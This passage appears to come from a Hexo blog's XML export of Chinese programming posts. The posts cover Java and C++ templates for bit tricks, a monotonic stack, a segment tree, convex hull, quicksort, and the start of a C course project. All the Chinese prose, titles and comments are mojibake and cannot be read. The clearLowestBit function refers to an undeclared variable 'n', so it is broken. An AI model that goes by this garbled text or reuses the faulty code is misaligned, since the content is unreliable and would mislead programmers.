<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å•ä¾‹çš„å®ç°æ–¹å¼æœ‰å¤šç§ï¼Œè¯¥æ€ä¹ˆé€‰æ‹©éœ€è¦æ ¹æ®å®é™…æƒ…å†µè€ƒè™‘ï¼Œå¦‚æœè¯´ä¸è€ƒè™‘å¤šçº¿ç¨‹åˆ™ç›´æ¥ä½¿ç”¨æ‡’æ±‰æ¨¡å¼ï¼Œç®€å•åˆèŠ‚çº¦ï¼Œå¦‚æœè¯´è€ƒè™‘å¤šçº¿ç¨‹åˆ™å»ºè®®ä½¿ç”¨åŒé‡æ ¡éªŒæ³•æˆ–è€…é™æ€å†…éƒ¨æ³•ï¼Œæˆ–è€…å¦‚æœè¯´ç¡®ä¿é¡¹ç›®ä¸­ä½¿ç”¨å•ä¾‹æƒ…å†µéå¸¸å°‘ï¼Œåˆ™å¯ä»¥è€ƒè™‘ä½¿ç”¨æšä¸¾å®ç°ã€‚</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>å•ä¾‹æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®—æ³•æ¨¡æ¿ä¹‹ä½æ“ä½œ</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E4%BD%8D%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>åœ¨è®¡ç®—æœºä¸­ï¼Œå¯¹æ•°æ®è¿›è¡Œä½æ“ä½œå…·æœ‰ååˆ†é«˜çš„æ•ˆç‡ï¼Œå°±æ‹¿ä¹˜æ³•æ¥è¯´ï¼Œå‡å¦‚ä¹˜æ•°æ˜¯ä¸€ä¸ª2<sup>N</sup>å½¢å¼çš„æ•°å­—ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨å·¦ç§»çš„æ–¹å¼ï¼Œä¾‹å¦‚ï¼š<code>n * 2 == n &lt;&lt; 1ã€n * 8 == n &lt;&lt; 3ã€n / 16 == n &gt;&gt; 4ã€</code>ï¼Œå®é™…ä¸Šä½æ“ä½œè¿˜æœ‰å…¶ä»–æ›´é«˜çº§çš„ç”¨æ³•ï¼š<a id="more"></a></p>
<h2 id="åˆ¤æ–­numæ˜¯å¦æ˜¯2çš„æ¬¡å¹‚"><a href="#åˆ¤æ–­numæ˜¯å¦æ˜¯2çš„æ¬¡å¹‚" class="headerlink" title="åˆ¤æ–­numæ˜¯å¦æ˜¯2çš„æ¬¡å¹‚"></a>åˆ¤æ–­numæ˜¯å¦æ˜¯2çš„æ¬¡å¹‚</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &gt; <span class="number">0</span> &amp;&amp; ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚"><a href="#å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚" class="headerlink" title="å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚"></a>å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">upperPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="è¿”å›numçš„æœ€é«˜æœ‰æ•ˆä½çš„æ©ç "><a href="#è¿”å›numçš„æœ€é«˜æœ‰æ•ˆä½çš„æ©ç " class="headerlink" title="è¿”å›numçš„æœ€é«˜æœ‰æ•ˆä½çš„æ©ç "></a>è¿”å›numçš„æœ€é«˜æœ‰æ•ˆä½çš„æ©ç </h2><p>å¦‚i=00..1xx..ï¼Œåˆ™è¿”å›00..100..</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">highestOneBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">1</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">2</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">4</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">8</span>);</span><br><span class="line">        num |= (num &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// æ— ç¬¦å·å³ç§»</span></span><br><span class="line">        <span class="keyword">return</span> num - (num &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¿ç•™æœ€å³è¾¹çš„â€œ1â€"><a href="#ä¿ç•™æœ€å³è¾¹çš„â€œ1â€" class="headerlink" title="ä¿ç•™æœ€å³è¾¹çš„â€œ1â€"></a>ä¿ç•™æœ€å³è¾¹çš„â€œ1â€</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rightmostOneBit</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &amp; (~num) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¸…é™¤æœ€å³è¾¹çš„â€œ1â€"><a href="#æ¸…é™¤æœ€å³è¾¹çš„â€œ1â€" class="headerlink" title="æ¸…é™¤æœ€å³è¾¹çš„â€œ1â€"></a>æ¸…é™¤æœ€å³è¾¹çš„â€œ1â€</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">clearLowestBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &amp; (n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>ä½æ“ä½œ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®—æ³•æ¨¡æ¿ä¹‹å•è°ƒé€’å‡æ ˆ</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%8D%95%E8%B0%83%E9%80%92%E5%87%8F%E6%A0%88/</url>
    <content><![CDATA[<h2 id="æ¨¡æ¿ä»£ç "><a href="#æ¨¡æ¿ä»£ç " class="headerlink" title="æ¨¡æ¿ä»£ç "></a>æ¨¡æ¿ä»£ç </h2><a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> LEN = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = LEN - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.empty() &amp;&amp; nums[i] &gt; stack.peek())&#123;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å•è°ƒé€’å‡æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¿æ®µæ ‘æ¨¡æ¿</title>
    <url>/2021/02/01/%E7%BA%BF%E6%AE%B5%E6%A0%91%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<!--åªæ˜¯ä¸€ä¸ªæ¨¡æ¿-->

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 1e2 + 1;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line">LL num[MAX_N], tree[MAX_N &lt;&lt; <span class="number">2</span>], tag[MAX_N &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="comment">// å¯¹ [l,r] åŒºé—´å»ºç«‹çº¿æ®µæ ‘,å½“å‰æ ¹çš„ç¼–å·ä¸º nowIndex</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r)&#123;</span><br><span class="line">        tree[nowIndex] = num[l];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ååºéå†çš„æ–¹å¼è¿›è¡Œå»ºæ ‘</span></span><br><span class="line">    build(l, mid, nowIndex &lt;&lt; <span class="number">1</span>), build(mid + <span class="number">1</span>, r, nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>);</span><br><span class="line">    tree[nowIndex] = tree[nowIndex &lt;&lt; <span class="number">1</span>] + tree[nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ›´æ–°[l,r]åŒºé—´ï¼ˆæ¯ä¸ªå…ƒç´ åŠ ä¸Škï¼‰ï¼Œç¼–å·ä¸º nowIndex çš„èŠ‚ç‚¹è®°å½•[L, R]çš„åŒºé—´å’Œ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex, LL k)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå½“å‰åŒºé—´æ˜¯å¾…ä¿®æ”¹åŒºé—´çš„å­é›†çš„æ—¶å€™ï¼Œæ‰“ä¸Šæ ‡è®°ã€æ›´æ”¹èŠ‚ç‚¹å€¼åç›´æ¥è¿”å›</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)&#123;</span><br><span class="line">        tree[nowIndex] += (R - L + <span class="number">1</span>) * k, tag[nowIndex] += k;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// å½“å‰èŠ‚ç‚¹ä¸æ˜¯å¶å­ç»“ç‚¹ã€æ ‡è®°ä¸ä¸ºç©ºçš„æ—¶å€™</span></span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// å°†æ ‡è®°ä¸‹ä¼ å¹¶ä¸”æ›´æ–°å·¦å³èŠ‚ç‚¹</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// æ¸…ç©ºå½“å‰èŠ‚ç‚¹çš„æ ‡è®°</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¦‚æœå·¦å„¿å­ä»£è¡¨çš„åŒºé—´ [L,mid] ä¸ä¿®æ”¹åŒºé—´æœ‰äº¤é›†,åˆ™é€’å½’æ›´æ–°å·¦å„¿å­</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)update(l, r, L, mid, leftNode, k);</span><br><span class="line">    <span class="comment">//å¦‚æœå³å„¿å­ä»£è¡¨çš„åŒºé—´ [mid + 1,R] ä¸ä¿®æ”¹åŒºé—´æœ‰äº¤é›†,åˆ™é€’å½’æ›´æ–°å·¦å„¿å­</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)update(l, r, mid + <span class="number">1</span>, R, rightNode, k);</span><br><span class="line">    tree[nowIndex] = tree[leftNode] + tree[rightNode];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢[l,r]åŒºé—´ï¼Œç¼–å·ä¸º nowIndex çš„èŠ‚ç‚¹è®°å½•[L, R]çš„åŒºé—´å’Œ</span></span><br><span class="line"><span class="function">LL <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå½“å‰åŒºé—´æ˜¯å¾…æŸ¥è¯¢åŒºé—´çš„å­é›†çš„æ—¶å€™ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)<span class="keyword">return</span> tree[nowIndex];</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// å°†æ ‡è®°ä¸‹ä¼ å¹¶ä¸”æ›´æ–°å·¦å³èŠ‚ç‚¹</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// æ¸…ç©ºå½“å‰èŠ‚ç‚¹çš„æ ‡è®°</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LL sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//å¦‚æœå·¦å„¿å­ä»£è¡¨çš„åŒºé—´ [L,mid] ä¸æŸ¥è¯¢åŒºé—´æœ‰äº¤é›†,åˆ™é€’å½’æŸ¥è¯¢å·¦å„¿å­</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)sum = getSum(l, r, L, mid, leftNode);</span><br><span class="line">    <span class="comment">//å¦‚æœå³å„¿å­ä»£è¡¨çš„åŒºé—´ [mid + 1,R] ä¸æŸ¥è¯¢åŒºé—´æœ‰äº¤é›†,åˆ™é€’å½’æŸ¥è¯¢å·¦å„¿å­</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)sum += getSum(l, r, mid + <span class="number">1</span>, R, rightNode);</span><br><span class="line">    <span class="keyword">return</span> sum;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>é€’å½’</tag>
        <tag>ä½æ“ä½œ</tag>
        <tag>ä¸è¿ç®—</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¡ç®—å‡ ä½•ä¹‹å‡¸åŒ…</title>
    <url>/2020/10/05/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95%E4%B9%8B%E5%87%B8%E5%8C%85/</url>
    <content><![CDATA[<h2 id="è®¡ç®—å‡ ä½•ä¹‹å‡¸åŒ…"><a href="#è®¡ç®—å‡ ä½•ä¹‹å‡¸åŒ…" class="headerlink" title="è®¡ç®—å‡ ä½•ä¹‹å‡¸åŒ…"></a>è®¡ç®—å‡ ä½•ä¹‹å‡¸åŒ…</h2><p>å‡¸åŒ…çš„å¤§æ¦‚æ„æ€æ˜¯ï¼Œåœ¨ç‚¹é›†<code>A</code>ä¸­ï¼Œé€‰å–å­é›†<code>a</code>ï¼Œå°†<code>a</code>ä¸­çš„ç‚¹è¿›è¡Œè¿çº¿å½¢æˆå¤šè¾¹å½¢ï¼ˆå‡è‹¥<code>a</code>ä¸­çš„ç‚¹å…±çº¿ï¼Œåˆ™å°†å¤šè¾¹å½¢è§†ä¸ºé«˜åº¦ä¸º0çš„é•¿æ–¹å½¢ï¼‰ï¼Œåˆ™<code>A</code>ä¸­çš„ç‚¹è¦ä¹ˆåœ¨å¤šè¾¹å½¢å†…éƒ¨ã€è¦ä¹ˆåœ¨å¤šè¾¹å½¢ä¸Šã€‚<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">Point points[MAXN + <span class="number">1</span>];</span><br><span class="line">Point <span class="built_in">stack</span>[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"><span class="comment">// å‘é‡å‰ç§¯</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(Point a, Point b, Point c)</span> </span>&#123; <span class="keyword">return</span> (b.x - a.x) * (c.y - b.y) - (c.x - b.x) * (b.y - a.y); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">andrew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> top1 = <span class="number">0</span>, top2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">       <span class="comment">// å¦‚æœå– &lt;= åˆ™ä¸åŒ…å«å…±çº¿æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; <span class="number">1</span> &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">    top2 = top1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; top2 &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(Point a, Point b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.x == b.x) <span class="keyword">return</span> a.y &lt; b.y;</span><br><span class="line">    <span class="keyword">return</span> a.x &lt; b.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>å‡¸åŒ…</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®—æ³•æ¨¡æ¿ä¹‹å¿«é€Ÿæ’åº</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>å¿«é€Ÿæ’åºå±äºæ€§èƒ½è¾ƒå¥½çš„æ’åºç®—æ³•ï¼Œèƒ½å¤Ÿå°†å¹³å‡çš„æ—¶é—´å¤æ‚åº¦è¶‹äº<code>O(nlogn)</code>ï¼Œè€Œç©ºé—´å¤æ‚åº¦ä¸º<code>O(1)</code>ã€‚<a id="more"></a></p>
<h2 id="æ¨¡æ¿ä»£ç "><a href="#æ¨¡æ¿ä»£ç " class="headerlink" title="æ¨¡æ¿ä»£ç "></a>æ¨¡æ¿ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>, key = array[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[j] &lt; key) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(i, j, array);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(l, i, array);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>, array);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r, array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¸è¿‡<code>JDK</code>è‡ªå¸¦çš„<code>Arrays.sort()</code>ä¸é¦™ä¹ˆï¼Œé™¤éé¢˜ç›®é™åˆ¶ä¸å¯ä»¥ä½¿ç”¨å§</strong></p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¿«é€Ÿæ’åº</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡Cè¯­è¨€ç¨‹åºè®¾è®¡</title>
    <url>/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>é‚£æ˜¯ä¸€ä¸ªé—·çƒ­çš„ä¸‹åˆï¼Œæ­£å€¼æœŸæœ«å¤ä¹ ä¹‹é™…ï¼Œçªç„¶æ‰‹æœºå“äº†ï¼š<a id="more"></a></p>
<p><img src="https://q.yalexin.top/%E8%81%8A%E5%A4%A9%E6%88%AA%E5%9B%BE.png" alt></p>
<p>ç„¶åå› ä¸ºæ˜¯é«˜ä¸­åŒæ¡Œå…¼èˆå‹ï¼Œæ‰€ä»¥å°±ç«‹é©¬æ¥äº†ä¸‹æ¥ã€‚ä½†æ˜¯å½“æ—¶æˆ‘è¿™è¾¹åˆšå¥½æ˜¯å‡†å¤‡è€ƒè¯•ï¼Œæ‰€ä»¥æ—¶é—´ä¸Šè‚¯å®šä¸å……è£•ï¼ŒåŸæœ¬æ˜¯æƒ³ç€ä¸¤ä¸‰å¤©å†™å‡ºæ¥ï¼Œä½†æ˜¯æœ€åå‘ç°ä¸€å¤©å·¦å³å°±å®Œæˆäº†ã€‚ä½†æ˜¯åŠŸèƒ½å¹¶æ²¡æœ‰å®Œå…¨å®ç°ï¼Œè¿˜å·®æœ€åçš„åŠŸèƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œä¹Ÿæ²¡æœ‰è¿‡å¤šçš„æµ‹è¯•ã€‚</p>
<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><img src="https://q.yalexin.top/%E9%A2%98%E7%9B%AE.jpg" alt></p>
<p>å…¶å®Cè¯­è¨€å¾ˆå¤šè¯¾ç¨‹è®¾è®¡é¢˜ç›®å¤§å¤šæ˜¯ä½¿ç”¨ç»“æ„ä½“+æ–‡ä»¶æ“ä½œï¼ˆä¸æ’é™¤å¤§ç¥çš„è¯¾è®¾åšå¾—å¾ˆå¤æ‚çš„æƒ…å†µï¼‰ï¼Œæˆ‘å½“å¹´æ‹¿åˆ°çš„å°±æ˜¯å­¦ç”Ÿæˆç»©ç®¡ç†ç³»ç»Ÿï¼Œå¯¹ï¼å°±æ˜¯è¿™ç§çƒ‚å¤§è¡—çš„é¢˜ç›®ï¼Œè¿™ç±»é¢˜ä¹Ÿæ˜¯ä½¿ç”¨ç»“æ„ä½“+æ–‡ä»¶æ“ä½œå°±å¯ä»¥è§£å†³ï¼Œä½†æ˜¯å½“æ—¶å¹´å°‘ä¸çŸ¥äº‹ï¼Œæ–‡ä»¶æ“ä½œæˆ‘è‡ªå·±ä¸€ç›´æŒæ¡å¾—ä¸å¥½ï¼Œæ‰€ä»¥å½“æ—¶çš„ç¨‹åºæ— æ³•ä¿å­˜æ•°æ®~~ï¼Œå½“æ—¶æˆ‘è¿˜å†™äº†å¥½ä¹…ï¼Œåœ¨ç•Œé¢ç¾è§‚ï¼ˆç‹—å±ç¾è§‚ï¼Œç°åœ¨æƒ³æƒ³å°±æ˜¯å¤ªèŠ±é‡Œèƒ¡å“¨äº†ï¼Œåœ¨é»‘æ¡†é‡Œè°ˆå•¥ç¾è§‚ï¼‰ä¸Šã€‚æ‰€ä»¥æœ¬æ¬¡è¯¾è®¾ï¼Œæˆ‘å°±ä¸è€ƒè™‘å•¥ç¾è§‚äº†ï¼Œæ¯•ç«Ÿæ—¶é—´æœ‰é™ï¼Œèƒ½åŠ›ä¹Ÿæœ‰é™ï¼Œç®€å•æ„æ€äº†å‡ åˆ†é’Ÿåï¼Œå°±æ ¹æ®æ•´ä½“æ¡†æ¶è®¾è®¡ç»“æ„ä½“äº†ï¼Œç„¶åâ€¦â€¦â€¦â€¦</p>
<h2 id="æºç¨‹åº"><a href="#æºç¨‹åº" class="headerlink" title="æºç¨‹åº"></a>æºç¨‹åº</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-26 15:12:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-27 15:09:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\maoning\1.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> country[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> type[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> director[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> producer[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> stars[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> inventory;</span><br><span class="line">    <span 